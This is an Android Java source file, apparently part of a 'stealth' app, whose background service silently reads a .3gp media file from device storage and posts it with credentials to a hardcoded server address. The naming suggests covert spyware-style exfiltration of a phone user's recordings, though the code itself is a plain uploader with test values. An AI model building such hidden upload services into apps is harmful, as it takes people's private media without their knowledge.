package com.mobi.stealth;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

public class UploadService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		Thread t = new Thread(mTask);
		t.start();
	}

	Runnable mTask = new Runnable() {

		private final static int CHUNK_SIZE = 1024 * 1536 ; 
		
		@Override
		public void run() {
			mediaFileUpload(UploadService.this, "3gp", "aa", "bb", "test.3gp", "test.3gp");
		}

		public boolean mediaFileUpload(Context appContext, String type,
				String userName, String password, String serverFile,
				String localFile) {

			BufferedReader buffReader = null;
			DataOutputStream dos = null;
			FileInputStream fis = null;
			File file = null;

			try {
				String sUrl = "http://192.168.1.2/upload.php";

				String boundary = "*****************************************";
				String newLine = "\r\n";
				int bytesAvailable;
				int bufferSize;
				int maxBufferSize = 4096;
				int bytesRead;
				if ((localFile.indexOf("vid") > -1 || localFile.indexOf("VID") > -1)
						&& localFile.endsWith(".3gp")) {
					file = new File(localFile);
					fis = new FileInputStream(file);
				} else if (localFile.endsWith(".3gp")) {
					String sdcardDirectory = Environment
							.getExternalStorageDirectory().getAbsolutePath();
					localFile = sdcardDirectory + "/" + localFile;
					Log.i("Log", ">"+localFile);
					file = new File(localFile);
					fis = new FileInputStream(file);
				} else {// it is debug file
					fis = appContext.openFileInput(localFile);

				}

				bytesAvailable = fis.available();
Log.i("Log", "bytes: "+bytesAvailable);
				URL url = new URL(sUrl);
				HttpURLConnection con = (HttpURLConnection) url
						.openConnection();
				con.setDoInput(true);
				con.setDoOutput(true);
				con.setUseCaches(false);
				con.setChunkedStreamingMode(CHUNK_SIZE);
				con.setRequestMethod("POST");
				con.setRequestProperty("Connection", "Keep-Alive");
				con.setRequestProperty("Content-Type",
						"multipart/form-data;boundary=" + boundary);

				dos = new DataOutputStream(con.getOutputStream());

				// upload files
				dos.writeBytes("--" + boundary + newLine);
				dos.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\""
						+ serverFile + "\"" + newLine + newLine);
				/***************************************/
				bufferSize = maxBufferSize;
				byte[] buffer = new byte[bufferSize];
				while ((bytesRead = fis.read(buffer)) > -1) {
					dos.write(buffer, 0, bytesRead);
				}
				/******************************************/
				dos.writeBytes(newLine);
				dos.writeBytes("--" + boundary + "--" + newLine);

				// Now write the username and password

				dos.writeBytes("--" + boundary + newLine);
				dos.writeBytes("Content-Disposition: form-data;name=\"" + "u"
						+ "\"" + newLine + newLine + userName);
				dos.writeBytes(newLine);
				dos.writeBytes("--" + boundary + "--" + newLine);

				dos.writeBytes("--" + boundary + newLine);
				dos.writeBytes("Content-Disposition: form-data;name=\"" + "p"
						+ "\"" + newLine + newLine + password);
				dos.writeBytes(newLine);
				dos.writeBytes("--" + boundary + "--" + newLine);

				dos.flush();
				int respCode = con.getResponseCode();

				Log.i("uploading", "[StealthHTTPProcessor-MediaFile]: respCode: "
						+ respCode + " : " + localFile);
				if (respCode == HttpURLConnection.HTTP_OK) {
					buffReader = new BufferedReader(new InputStreamReader(
							con.getInputStream()));
					String line;
					line = buffReader.readLine();

					
					Log.i("uploading", "[StealthHTTPProcessor]: server Response: "
							+ line+"-->"+dos);
					

					if (line.equals("SUCCESS")) {
						return true;
					} else {
						Log.i("Log", "[StealthHTTPProcessor]: response was not success ");
						return false;
					}

				} else {
					// EmailLog.console("[StealthHTTPProcessor]: returned respCode "
					// + respCode);
					return false;
				}

			} catch (Exception e) {
				Log.e("Log", e.toString(), e);
				return false;
			} finally {
				try {
					if (buffReader != null) {
						buffReader.close();
					}

				} catch (Exception e) {
					Log.e("Log", e.toString(), e);
				}
				try {
					if (fis != null) {
						fis.close();
					}
				} catch (Exception e) {
					Log.e("Log", e.toString(), e);
				}

				try {
					if (dos != null) {
						dos.close();
					}
				} catch (Exception e) {
					Log.e("Log", e.toString(), e);
				}
			}
		}
	};

}
